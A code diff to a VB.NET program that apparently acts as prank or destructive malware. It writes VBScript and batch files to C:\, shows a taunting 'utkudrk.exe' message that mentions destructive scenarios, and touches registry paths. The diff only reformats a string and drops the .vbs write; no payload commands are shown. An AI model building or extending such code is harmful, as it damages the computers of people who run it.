@@ -177,10 +177,9 @@ Public Class Form2
         Dim vbsFilePath As String = "C:\temp.vbs"
         Dim batFilePath As String = "C:\temp.bat"
 
-        ' VBScript content
+        ' VBScript content (kept as a single string)
         Dim vbsContent As String =
-        "MsgBox ""What Are Your Famous Last Words? Spoiler: There are two scenarios to get this message but one of them is not so destructive. " &
-        "No UEFI Driver or Kernel Driver Malware this time. Because it's easy to fix. If you see this from starting at Windows"", 0, ""utkudrk.exe""" & vbCrLf &
+        "MsgBox ""What Are Your Famous Last Words? Spoiler: There are two scenarios to get this message but one of them is not so destructive. No UEFI Driver or Kernel Driver Malware this time. Because it's easy to fix. If you see this from starting at Windows"", 0, ""utkudrk.exe""" & vbCrLf &
         "Dim userInput" & vbCrLf &
         "userInput = InputBox(""Enter your response (Just don't say FUCK YOU):"", ""utkudrk.exe"")" & vbCrLf &
         "If userInput = ""FUCK YOU"" Then" & vbCrLf &
@@ -215,7 +214,6 @@ Public Class Form2
 
         Try
             ' Write the VBScript and batch file content
-            File.WriteAllText(vbsFilePath, vbsContent)
             File.WriteAllText(batFilePath, batContent)
 
             ' Registry paths
